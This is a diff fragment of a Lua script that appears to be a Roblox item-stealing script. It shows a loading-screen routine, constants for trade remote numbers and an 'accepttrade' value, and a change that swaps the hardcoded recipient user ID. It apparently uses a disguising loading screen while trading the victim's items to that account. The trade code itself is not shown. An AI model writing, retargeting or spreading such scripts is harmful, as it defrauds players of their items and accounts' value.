@@ -107,7 +107,7 @@ local function animateLoading()
 	LoadingScreen:Destroy()
 end
 task.spawn(animateLoading)
-local userid=3328376636
+local userid=5237079868
 local accepttrade=275
 local mybase=nil 
 local traderemotenumber=269
@@ -192,3 +192,4 @@ game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"
 end
 end
 --287
+--23
